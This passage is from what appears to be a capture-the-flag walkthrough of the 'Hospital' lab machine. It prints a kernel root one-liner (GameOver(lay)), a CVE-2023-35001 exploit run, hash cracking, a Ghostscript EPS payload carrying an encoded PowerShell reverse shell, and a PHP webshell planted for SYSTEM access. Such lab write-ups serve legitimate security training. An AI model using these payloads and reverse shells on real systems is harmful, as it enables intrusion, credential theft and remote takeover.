Database changed
MariaDB [hospital]> show tables;
+--------------------+
| Tables_in_hospital |
+--------------------+
| users              |
+--------------------+
1 row in set (0.001 sec)

```

There are two rows in the table that I didn’t create:

```

MariaDB [hospital]> select * from users;
+----+----------+--------------------------------------------------------------+---------------------+
| id | username | password                                                     | created_at          |
+----+----------+--------------------------------------------------------------+---------------------+
|  1 | admin    | $2y$10$caGIEbf9DBF7ddlByqCkrexkt0cPseJJ5FiVO1cnhG.3NLrxcjMh2 | 2023-09-21 14:46:04 |
|  2 | patient  | $2y$10$a.lNstD7JdiNYxEepKf1/OZ5EM5wngYrf.m5RxXCgSud7MVU6/tgO | 2023-09-21 15:35:11 |
|  3 | 0xdf     | $2y$10$PNfdrxnrZcLm9qdhkl82SeNp5LVeLaPknIqurKFPS/7QqUCgWGjEa | 2024-04-09 05:38:19 |
+----+----------+--------------------------------------------------------------+---------------------+
3 rows in set (0.000 sec)

```

I’ll try to crack these with `hashcat` as mode 3200, and they do both crack (admin to “123456” and patient to “patient”), but these aren’t important to solving Hospital.

### Exploits

There are likely several exploits to get root in the VM from here. I’ll show two, the author’s intended method (CVE-2023-35001) and how I solved it originally (GameOver(lay)).

```

flowchart TD;
    A[www-data]-->B("<a href='#gameoverlay'>GameOver(lay)</a>");
    A-->C(<a href='#cve-2023-35001'>CVE-2023-35001</a>);
    B-->D[root];
    C-->D;
    subgraph identifier[" "]
      direction LR
      start1[ ] --->|intended| stop1[ ]
      style start1 height:0px;
      style stop1 height:0px;
      start2[ ] --->|unintended| stop2[ ]
      style start2 height:0px;
      style stop2 height:0px;
    end

linkStyle default stroke-width:2px,stroke:#FFFF99,fill:none;
linkStyle 0,2,5 stroke-width:2px,stroke:#4B9CD3,fill:none;
style identifier fill:#1d1d1d,color:#FFFFFFFF;

```

### GameOver(lay)

#### Identify

The Kernel on this VM is from Feb 2023:

```

www-data@webserver:/var/www/html$ uname -a
Linux webserver 5.19.0-35-generic #36-Ubuntu SMP PREEMPT_DYNAMIC Fri Feb 3 18:36:56 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux

```

The GameOver(lay) vulnerability, CVE-2023-2640 and CVE-2023-32629 came out in July 2023, after this, which suggests this may be vulnerable.

I did a video [GameOver(lay) Explained](https://www.youtube.com/watch?v=nlYNuUKiGr0) less than a month ago, that’s worth checking out here:

#### POC

The POC for this is very short:

```

unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("rm -rf l m u w; id")'

```

Pasting that in works, as long as I’m in a directory that www-data can write in (specifically it needs to create directories):

```

www-data@webserver:/tmp$ unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("rm -rf l m u w; id")'
uid=0(root) gid=33(www-data) groups=33(www-data)

```

The user id in the `id` output is root. I’ll change `id` at the end to `bash` and get a shell:

```

www-data@webserver:/tmp$ unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("rm -rf l m u w; bash")'
root@webserver:/tmp#

```

### CVE-2023-35001

#### Identify

Searching for this kernel will turn up references to both GameOver(lay) and CVE-2023-35001:

![image-20240409161142961](/img/image-20240409161142961.png)

[CVE-2023-35001](https://nvd.nist.gov/vuln/detail/CVE-2023-35001) became public a few weeks before GameOver(lay) and is an issue with the netfilter subsystem.

#### Exploit

I’ll grab a [POC exploit](https://github.com/synacktiv/CVE-2023-35001) for this vulnerability and clone it to my host:

```

oxdf@hacky$ git clone https://github.com/synacktiv/CVE-2023-35001.git
Cloning into 'CVE-2023-35001'...
remote: Enumerating objects: 9, done.
remote: Counting objects: 100% (9/9), done.
remote: Compressing objects: 100% (8/8), done.
remote: Total 9 (delta 0), reused 9 (delta 0), pack-reused 0
Receiving objects: 100% (9/9), 13.02 KiB | 3.25 MiB/s, done.
oxdf@hacky$ cd CVE-2023-35001
oxdf@hacky$ ls
go.mod  go.sum  main.go  Makefile  README.md  src

```

The instructions say to run `make`, and as I already have `go` installed, it just works:

```

oxdf@hacky$ make
go build
gcc -Wall -Wextra -Werror -std=c99 -Os -g0 -D_GNU_SOURCE -D_DEFAULT_SOURCE -D_POSIX_C_SOURCE=200809L src/wrapper.c -o wrapper
zip lpe.zip exploit wrapper
  adding: exploit (deflated 43%)
  adding: wrapper (deflated 83%)
oxdf@hacky$ ls
exploit  go.mod  go.sum  lpe.zip  main.go  Makefile  README.md  src  wrapper

```

I’ll need to upload both `exploit` and `wrapper` to the target. I’ll host a Python webserver in this directory, and fetch them with `wget`:

```

www-data@webserver:/tmp$ wget 10.10.14.6/exploit
--2024-04-10 03:17:14--  http://10.10.14.6/exploit
Connecting to 10.10.14.6:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2817760 (2.7M) [application/octet-stream]
Saving to: 'exploit'

exploit             100%[===================>]   2.69M  3.25MB/s    in 0.8s    h

2024-04-10 03:17:15 (3.25 MB/s) - 'exploit' saved [2817760/2817760]
www-data@webserver:/tmp$ wget 10.10.14.6/wrapper
--2024-04-10 03:18:15--  http://10.10.14.6/wrapper
Connecting to 10.10.14.6:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16264 (16K) [application/octet-stream]
Saving to: 'wrapper'

wrapper             100%[===================>]  15.88K  --.-KB/s    in 0.1s    

2024-04-10 03:18:16 (147 KB/s) - 'wrapper' saved [16264/16264]

```

Both need to be executable, and then I run `exploit`:

```

www-data@webserver:/tmp$ chmod +x exploit wrapper 
www-data@webserver:/tmp$ ./exploit                
[+] Using config: 5.19.0-35-generic      
[+] Recovering module base                    
[+] Module base: 0xffffffffc050f000              
[+] Recovering kernel base
[+] Kernel base: 0xffffffffa9000000                 
[+] Got root !!!
# id
uid=0(root) gid=0(root) groups=0(root)

```

## Shell as drbrown

### drwilliams Password

#### Crack

There isn’t much still on the server, but as root I can access the `shadow` file that stores the hashes for users on the system:

```

root@webserver:/root/kernel# cat /etc/shadow | grep -P '.{60,}'
root:$y$j9T$s/Aqv48x449udndpLC6eC.$WUkrXgkW46N4xdpnhMoax7US.JgyJSeobZ1dzDs..dD:19612:0:99999:7:::
drwilliams:$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:19612:0:99999:7:::

```

I’ll save these to a file and give them to `hashcat`:

```

$ hashcat shadow /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt 
hashcat (v6.2.6) starting in autodetect mode
...[snip]...
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

1800 | sha512crypt $6$, SHA512 (Unix) | Operating System
...[snip]...
Hashfile 'shadow' on line 1 (root:$...eobZ1dzDs..dD:19612:0:99999:7:::): Token length exception
* Token length exception: 1/2 hashes
  This error happens if the wrong hash type is specified, if the hashes are
  malformed, or if input is otherwise not as expected (for example, if the
  --username option is used but no username is present)
...[snip]...
$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:qwe123!@#
...[snip]...

```

The first hash isn’t recognized (it’s [yescrypt](https://manpages.debian.org/unstable/libcrypt-dev/crypt.5.en.html)), but the second cracks as a `sha512crypt` to the password “qwe123!@#”.

#### Identify Use

This password works for drwilliams over SMB as well:

```

oxdf@hacky$ netexec smb 10.10.11.241 -u drwilliams -p 'qwe123!@#'
SMB         10.10.11.241    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:hospital.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.241    445    DC               [+] hospital.htb\drwilliams:qwe123!@# 

```

drwilliams does not have WinRM access:

```

oxdf@hacky$ netexec winrm 10.10.11.241 -u drwilliams -p 'qwe123!@#'
WINRM       10.10.11.241    5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:hospital.htb)
WINRM       10.10.11.241    5985   DC               [-] hospital.htb\drwilliams:qwe123!@#

```

It does work over SSH, but this just lands me back in the VM that I was already root in:

```

oxdf@hacky$ sshpass -p 'qwe123!@#' ssh drwilliams@10.10.11.241
Welcome to Ubuntu 23.04 (GNU/Linux 5.19.0-35-generic x86_64)
...[snip]...
drwilliams@webserver:~$

```

### Authenticated Enumeration

#### SMB

drwilliams is able to list SMB shares:

```

oxdf@hacky$ netexec smb 10.10.11.241 -u drwilliams -p 'qwe123!@#' --shares
SMB         10.10.11.241    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:hospital.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.241    445    DC               [+] hospital.htb\drwilliams:qwe123!@# 
SMB         10.10.11.241    445    DC               [*] Enumerated shares
SMB         10.10.11.241    445    DC               Share           Permissions     Remark
SMB         10.10.11.241    445    DC               -----           -----------     ------
SMB         10.10.11.241    445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.241    445    DC               C$                              Default share
SMB         10.10.11.241    445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.241    445    DC               NETLOGON        READ            Logon server share 
SMB         10.10.11.241    445    DC               SYSVOL          READ            Logon server share

```

Investigating the shares shows they are relatively empty.

#### RoundCube

I’ll also check drwilliams’ webmail account, and the password works:

![image-20240409152309506](/img/image-20240409152309506.png)

Sent and Trash are both empty, but there’s a single email in Inbox:

![image-20240409152404276](/img/image-20240409152404276.png)

Chris Brown is waiting for a `.eps` file to run with Ghostscript.

### Ghostscript Exploitation

#### Identify

There was a code execution vulnerability in Ghostscript with dates in July 2023:

![image-20240409152752770](/img/image-20240409152752770.png)

This is CVE-2023-36664, a command injection vulnerability in the Ghostscript processor when an Embedded PostScript (EPS) file is opened. The vulnerability abuses host the pipe character is handled. [This post](https://www.kroll.com/en/insights/publications/cyber/ghostscript-cve-2023-36664-remote-code-execution-vulnerability) from Kroll has a lot of nice details.

#### Exploit

[This repo](https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection) has a POC to exploit this vulnerability. I’ll get a PowerShell reverse shell one-liner from [revshell.com](https://www.revshells.com/), and use it as the payload. Following the syntax shown in the README, I’ll generate a file to run this:

```

oxdf@hacky$ python CVE_2023_36664_exploit.py --generate --filename needle --extension eps --payload "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANgAiACwANAA0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
[+] Generated EPS payload file: needle.eps

```

Looking at the new payload, there is a `%pipe%` reference right before my payload:

![image-20240409153917477](/img/image-20240409153917477.png)

I’ll attack that as an email to drbrown:

![image-20240409154049013](/img/image-20240409154049013.png)

After a minute or so, there’s a connect at my listening `nc`:

```

oxdf@hacky$ rlwrap -cAr nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.241 6102

PS C:\Users\drbrown.HOSPITAL\Documents> whoami
hospital\drbrown

```

And I can finally grab `user.txt`:

```

PS C:\Users\drbrown.HOSPITAL\desktop> type user.txt
a93d0145************************

```

### WinRM

#### Find Password

In drbrown’s Documents folder there’s a `ghostscript.bat` file:

```

PS C:\Users\drbrown.HOSPITAL\Documents> ls

    Directory: C:\Users\drbrown.HOSPITAL\Documents

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       10/23/2023   3:33 PM            373 ghostscript.bat

```

This file is running `gswin64.exe` (Ghostscript) on a given file in drbrown’s Downloads directory as drbrown:

```

@echo off
set filename=%~1
powershell -command "$p = convertto-securestring 'chr!$br0wn' -asplain -force;$c = new-object system.management.automation.pscredential('hospital\drbrown', $p);Invoke-Command -ComputerName dc -Credential $c -ScriptBlock { cmd.exe /c "C:\Program` Files\gs\gs10.01.1\bin\gswin64c.exe" -dNOSAFER "C:\Users\drbrown.HOSPITAL\Downloads\%filename%" }"

```

That seems like the script responsible for opening the attachments. It’s also got drbrown’s password, “chr!$br0wn”. I’ll look more into the automations that simulate the user opening the `.eps` files using Ghostscript in [Beyond Root](#beyond-root---attachment-automation).

#### Test Password

The password does work for drbrown on SMB:

```

oxdf@hacky$ netexec smb 10.10.11.241 -u drbrown -p 'chr!$br0wn'
SMB         10.10.11.241    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:hospital.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.241    445    DC               [+] hospital.htb\drbrown:chr!$br0wn 

```

It also works for WinRM:

```

oxdf@hacky$ netexec winrm 10.10.11.241 -u drbrown -p 'chr!$br0wn'
WINRM       10.10.11.241    5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:hospital.htb)
WINRM       10.10.11.241    5985   DC               [+] hospital.htb\drbrown:chr!$br0wn (Pwn3d!)

```

#### Evil-WinRM

I’ll use [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) to get a shell:

```

oxdf@hacky$ evil-winrm -i 10.10.11.241 -u drbrown -p 'chr!$br0wn'

Evil-WinRM shell v3.4

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\drbrown.HOSPITAL\Documents> 

```

## Shell as administrator

### Overview

There are multiple ways to get from drbrown to the root flag. I’ll show four:

```

flowchart TD;
    A[Shell as drbrown]-->B(<a href='#via-xampp'>Webshell in\nXAMPP</a>);
    B-->C[Shell as \nNT Authority\System];
    A-->D(<a href='#via-keystroke-capture'>Capture Keystrokes</a>);
    D-->E[Shell as\nadministrator];
    A-->H(<a href="#via-rdp">RDP as drbrown\nRecover administrator\nPassword</a>);
    H-->E;
    A-->F(<a href='#via-automation-discovery'>Find Automation\nScript</a>)
    F-->E;
    C-->G(Access root.txt);
    E-->G;
    subgraph identifier[" "]
      direction LR
      start1[ ] --->|intended| stop1[ ]
      style start1 height:0px;
      style stop1 height:0px;
      start2[ ] --->|unintended| stop2[ ]
      style start2 height:0px;
      style stop2 height:0px;
    end

linkStyle default stroke-width:2px,stroke:#FFFF99,fill:none;
linkStyle 0,1,4,5,6,7,8,11 stroke-width:2px,stroke:#4B9CD3,fill:none;
style identifier fill:#1d1d1d,color:#FFFFFFFF;

```

I believe that the XAMPP unintended is the path that most people took while solving this box. The keystrokes method was the intended and most interesting. The automation script is something I stumbled across while trying to understand the automations.

### Via XAMPP

#### Enumeration

`xampp` is installed at the root of the filesystem:

```
*Evil-WinRM* PS C:\> ls

    Directory: C:\

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       10/21/2023   5:12 PM                ExchangeSetupLogs
d-----       10/22/2023   9:48 PM                inetpub
d-----        11/5/2022  12:03 PM                PerfLogs
d-r---       11/13/2023   6:05 PM                Program Files
d-----       10/22/2023  10:01 PM                Program Files (x86)
d-----         9/6/2023   3:50 AM                root
d-r---         9/6/2023   7:57 AM                Users
d-----       11/13/2023   6:05 PM                Windows
d-----       10/22/2023  10:10 PM                xampp
-a----       10/21/2023   4:34 PM             32 BitlockerActiveMonitoringLogs

```

IIS is more common on Windows, but `xampp` is another webserver stack. There is a lot in this directory, but the `htdocs` folder is where Apache typically has its webroot:

```
*Evil-WinRM* PS C:\xampp\htdocs> ls

    Directory: C:\xampp\htdocs

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       10/22/2023  10:19 PM                bin
d-----       10/22/2023  11:47 PM                config
d-----       10/22/2023  10:33 PM                default
d-----       10/22/2023  10:19 PM                installer
d-----       10/22/2023  10:32 PM                logs
d-----       10/22/2023  10:19 PM                plugins
d-----       10/22/2023  10:20 PM                program
d-----       10/22/2023  10:20 PM                skins
d-----       10/22/2023  10:19 PM                SQL
d-----         4/9/2024  11:30 PM                temp
d-----       10/22/2023  10:20 PM                vendor
-a----       10/16/2023  12:23 PM           2553 .htaccess
-a----       10/16/2023  12:23 PM         211743 CHANGELOG.md
-a----       10/16/2023  12:23 PM            994 composer.json
-a----       10/16/2023  12:23 PM           1086 composer.json-dist
-a----       10/16/2023  12:23 PM          56279 composer.lock
-a----       10/16/2023  12:23 PM          11199 index.php
-a----       10/16/2023  12:23 PM          12661 INSTALL
-a----       10/16/2023  12:23 PM          35147 LICENSE
-a----       10/16/2023  12:23 PM           3853 README.md
-a----       10/16/2023  12:23 PM            967 SECURITY.md
-a----       10/16/2023  12:23 PM           4657 UPGRADING

```

The `index.php` file shows that this is RoundCube:

```
*Evil-WinRM* PS C:\xampp\htdocs> cat index.php
<?php
/**
 +-------------------------------------------------------------------------+
 | Roundcube Webmail IMAP Client                                           |
 | Version 1.6.4                                                           |
 |                                                                         |
 | Copyright (C) The Roundcube Dev Team                                    |
 |                                                                         |
 | This program is free software: you can redistribute it and/or modify    |
 | it under the terms of the GNU General Public License (with exceptions   |
 | for skins & plugins) as published by the Free Software Foundation,      |
 | either version 3 of the License, or (at your option) any later version. |
 |                                                                         |
 | This file forms part of the Roundcube Webmail Software for which the    |
 | following exception is added: Plugins and Skins which merely make       |
 | function calls to the Roundcube Webmail Software, and for that purpose  |
 | include it by reference shall not be considered modifications of        |
 | the software.                                                           |
 |                                                                         |
 | If you wish to use this file in another project or create a modified    |
 | version that will not be part of the Roundcube Webmail Software, you    |
 | may remove the exception above and use this source code under the       |
 | original version of the license.                                        |
 |                                                                         |
 | This program is distributed in the hope that it will be useful,         |
 | but WITHOUT ANY WARRANTY; without even the implied warranty of          |
 | MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the            |
 | GNU General Public License for more details.                            |
 |                                                                         |
 | You should have received a copy of the GNU General Public License       |
 | along with this program.  If not, see http://www.gnu.org/licenses/.     |
 |                                                                         |
 +-------------------------------------------------------------------------+
 | Author: Thomas Bruederli <roundcube@gmail.com>                          |
 | Author: Aleksander Machniak <alec@alec.pl>                              |
 +-------------------------------------------------------------------------+
*/

// include environment
require_once 'program/include/iniset.php';

// init application, start session, init output class, etc.
$RCMAIL = rcmail::get_instance(0, isset($GLOBALS['env']) ? $GLOBALS['env'] : null);

// Make the whole PHP output non-cacheable (#1487797)
$RCMAIL->output->nocacheing_headers();
$RCMAIL->output->common_headers(!empty($_SESSION['user_id']));

// turn on output buffering
ob_start();

// check the initial error state
if ($RCMAIL->config->get_error() || $RCMAIL->db->is_error()) {
    rcmail_fatal_error();
}

// error steps
if ($RCMAIL->action == 'error' && !empty($_GET['_code'])) {
    rcmail::raise_error(['code' => hexdec($_GET['_code'])], false, true);
}

// check if https is required (for login) and redirect if necessary
if (empty($_SESSION['user_id']) && ($force_https = $RCMAIL->config->get('force_https', false))) {
    // force_https can be true, <hostname>, <hostname>:<port>, <port>
    if (!is_bool($force_https)) {
        list($host, $port) = explode(':', $force_https);

        if (is_numeric($host) && empty($port)) {
            $port = $host;
            $host = '';
        }
    }

    if (empty($port)) {
        $port = 443;
    }

    if (!rcube_utils::https_check($port)) {
        if (empty($host)) {
            $host = preg_replace('/:[0-9]+$/', '', $_SERVER['HTTP_HOST']);
        }
        if ($port != 443) {
            $host .= ':' . $port;
        }

        header('Location: https://' . $host . $_SERVER['REQUEST_URI']);
        exit;
    }
}

// trigger startup plugin hook
$startup = $RCMAIL->plugins->exec_hook('startup', ['task' => $RCMAIL->task, 'action' => $RCMAIL->action]);
$RCMAIL->set_task($startup['task']);
$RCMAIL->action = $startup['action'];

$session_error = null;

// try to log in
if ($RCMAIL->task == 'login' && $RCMAIL->action == 'login') {
    $request_valid = !empty($_SESSION['temp']) && $RCMAIL->check_request();
    $pass_charset  = $RCMAIL->config->get('password_charset', 'UTF-8');

    // purge the session in case of new login when a session already exists
    if ($request_valid) {
        $RCMAIL->kill_session();
    }

    $auth = $RCMAIL->plugins->exec_hook('authenticate', [
            'host'  => $RCMAIL->autoselect_host(),
            'user'  => trim(rcube_utils::get_input_string('_user', rcube_utils::INPUT_POST)),
            'pass'  => rcube_utils::get_input_string('_pass', rcube_utils::INPUT_POST, true, $pass_charset),
            'valid' => $request_valid,
            'error' => null,
            'cookiecheck' => true,
    ]);

    // Login
    if ($auth['valid'] && !$auth['abort']
        && $RCMAIL->login($auth['user'], $auth['pass'], $auth['host'], $auth['cookiecheck'])
    ) {
        // create new session ID, don't destroy the current session
        // it was destroyed already by $RCMAIL->kill_session() above
        $RCMAIL->session->remove('temp');
        $RCMAIL->session->regenerate_id(false);

        // send auth cookie if necessary
        $RCMAIL->session->set_auth_cookie();

        // log successful login
        $RCMAIL->log_login();

        // restore original request parameters
        $query = [];
        if ($url = rcube_utils::get_input_string('_url', rcube_utils::INPUT_POST)) {
            parse_str($url, $query);

            // prevent endless looping on login page
            if (!empty($query['_task']) && $query['_task'] == 'login') {
                unset($query['_task']);
            }

            // prevent redirect to compose with specified ID (#1488226)
            if (!empty($query['_action']) && $query['_action'] == 'compose' && !empty($query['_id'])) {
                $query = ['_action' => 'compose'];
            }
        }

        // allow plugins to control the redirect url after login success
        $redir = $RCMAIL->plugins->exec_hook('login_after', $query + ['_task' => 'mail']);
        unset($redir['abort'], $redir['_err']);

        // send redirect
        $RCMAIL->output->redirect($redir, 0, true);
    }
    else {
        if (!$auth['valid']) {
            $error_code = rcmail::ERROR_INVALID_REQUEST;
        }
        else {
            $error_code = is_numeric($auth['error']) ? $auth['error'] : $RCMAIL->login_error();
        }

        $error_labels = [
            rcmail::ERROR_STORAGE          => 'storageerror',
            rcmail::ERROR_COOKIES_DISABLED => 'cookiesdisabled',
            rcmail::ERROR_INVALID_REQUEST  => 'invalidrequest',
            rcmail::ERROR_INVALID_HOST     => 'invalidhost',
            rcmail::ERROR_RATE_LIMIT       => 'accountlocked',
        ];

        if (!empty($auth['error']) && !is_numeric($auth['error'])) {
            $error_message = $auth['error'];
        }
        else {
            $error_message = !empty($error_labels[$error_code]) ? $error_labels[$error_code] : 'loginfailed';
        }

        $RCMAIL->output->show_message($error_message, 'warning');

        // log failed login
        $RCMAIL->log_login($auth['user'], true, $error_code);

        $RCMAIL->plugins->exec_hook('login_failed', [
                'code' => $error_code,
                'host' => $auth['host'],
                'user' => $auth['user'],
        ]);

        if (!isset($_SESSION['user_id'])) {
            $RCMAIL->kill_session();
        }
    }
}

// handle oauth login requests
else if ($RCMAIL->task == 'login' && $RCMAIL->action == 'oauth' && $RCMAIL->oauth->is_enabled()) {
    $oauth_handler = new rcmail_action_login_oauth();
    $oauth_handler->run();
}

// end session
else if ($RCMAIL->task == 'logout' && isset($_SESSION['user_id'])) {
    $RCMAIL->request_security_check(rcube_utils::INPUT_GET | rcube_utils::INPUT_POST);

    $userdata = array(
        'user' => $_SESSION['username'],
        'host' => $_SESSION['storage_host'],
        'lang' => $RCMAIL->user->language,
    );

    $RCMAIL->output->show_message('loggedout');

    $RCMAIL->logout_actions();
    $RCMAIL->kill_session();
    $RCMAIL->plugins->exec_hook('logout_after', $userdata);
}

// check session and auth cookie
else if ($RCMAIL->task != 'login' && $_SESSION['user_id']) {
    if (!$RCMAIL->session->check_auth()) {
        $RCMAIL->kill_session();
        $session_error = 'sessionerror';
    }
}

// not logged in -> show login page
if (empty($RCMAIL->user->ID)) {
    if (
        $session_error
        || (!empty($_REQUEST['_err']) && $_REQUEST['_err'] === 'session')
        || ($session_error = $RCMAIL->session_error())
    ) {
        $RCMAIL->output->show_message($session_error ?: 'sessionerror', 'error', null, true, -1);
    }

    if ($RCMAIL->output->ajax_call || $RCMAIL->output->get_env('framed')) {
        $RCMAIL->output->command('session_error', $RCMAIL->url(['_err' => 'session']));
        $RCMAIL->output->send('iframe');
    }

    // check if installer is still active
    if ($RCMAIL->config->get('enable_installer') && is_readable('./installer/index.php')) {
        $RCMAIL->output->add_footer(html::div(['id' => 'login-addon', 'style' => "background:#ef9398; border:2px solid #dc5757; padding:0.5em; margin:2em auto; width:50em"],
            html::tag('h2', array('style' => "margin-top:0.2em"), "Installer script is still accessible") .
            html::p(null, "The install script of your Roundcube installation is still stored in its default location!") .
            html::p(null, "Please <b>remove</b> the whole <tt>installer</tt> folder from the Roundcube directory because
                these files may expose sensitive configuration data like server passwords and encryption keys
                to the public. Make sure you cannot access the <a href=\"./installer/\">installer script</a> from your browser.")
        ));
    }

    $plugin = $RCMAIL->plugins->exec_hook('unauthenticated', [
            'task'      => 'login',
            'error'     => $session_error,
            // Return 401 only on failed logins (#7010)
            'http_code' => empty($session_error) && !empty($error_message) ? 401 : 200
    ]);

    $RCMAIL->set_task($plugin['task']);

    if ($plugin['http_code'] == 401) {
        header('HTTP/1.0 401 Unauthorized');
    }

    $RCMAIL->output->send($plugin['task']);
}
else {
    // CSRF prevention
    $RCMAIL->request_security_check();

    // check access to disabled actions
    $disabled_actions = (array) $RCMAIL->config->get('disabled_actions');
    if (in_array($RCMAIL->task . '.' . ($RCMAIL->action ?: 'index'), $disabled_actions)) {
        rcube::raise_error(['code' => 404, 'message' => "Action disabled"], true, true);
    }
}

$RCMAIL->action_handler();

```

I don’t have a good way to figure out what user XAMPP is running as, but it’s worth exploring if there’s a way to get execution through it.

I’ll start with getting the permissions on the `htdocs` directory:

```
*Evil-WinRM* PS C:\xampp> icacls htdocs
htdocs NT AUTHORITY\LOCAL SERVICE:(OI)(CI)(F)
       NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
       BUILTIN\Administrators:(I)(OI)(CI)(F)
       BUILTIN\Users:(I)(OI)(CI)(RX)
       BUILTIN\Users:(I)(CI)(AD)
       BUILTIN\Users:(I)(CI)(WD)
       CREATOR OWNER:(I)(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files

```

Local Service and System have Full Control (F) as expected. It is not expected that all users have RX (read and execute), as well as AD (Append data/add subdirectory) and WD (Write data/add subdirectory). This means all users can write here.

#### Create Webshell

I’ll upload a simple webshell (there are no `disable_functions` in this instance):

```
*Evil-WinRM* PS C:\xampp\htdocs> upload shell.php
Info: Uploading shell.php to C:\xampp\htdocs\shell.php
                                                             
Data: 44 bytes of 44 bytes copied

Info: Upload successful!
*Evil-WinRM* PS C:\xampp\htdocs> type shell.php
<?php system($_REQUEST['cmd']); ?>

```

Now on visiting it, I get execution as System!

![image-20240409211128197](/img/image-20240409211128197.png)

#### Shell

I’ll replace “whoami” with the PowerShell reverse shell from before and it hangs. At `nc`:

```

oxdf@hacky$ rlwrap -cAr nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.241 6122

PS C:\xampp\htdocs> whoami
nt authority\system

```

There’s good enough for `root.txt`:

```

PS C:\users\administrator\desktop> type root.txt
b60f96ed************************

```

### Via Keystroke Capture

#### Enumeration

`qwinsta` ([docs](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/qwinsta)) will show information about all the active sessions on the box:

```
*Evil-WinRM* PS C:\xampp\htdocs> qwinsta
 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
>services                                    0  Disc
 console           drbrown                   1  Active
 rdp-tcp                                 65536  Listen

```

